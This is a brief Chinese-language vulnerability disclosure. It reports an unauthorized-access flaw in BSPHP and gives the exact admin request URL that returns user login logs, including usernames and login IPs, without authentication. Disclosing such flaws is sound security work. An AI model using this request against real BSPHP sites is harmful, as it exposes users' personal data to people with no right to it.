# BSPHP存在未授权访问

该处泄漏的⽤户名和用户登陆 IP

URL格式如下：

```
http://127.0.0.1/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&
```

直接进行访问即可获得如下数据

![](./BSPHP存在未授权访问/wp_editor_md_90752b3880f4de0612a22c38542748d8.jpg)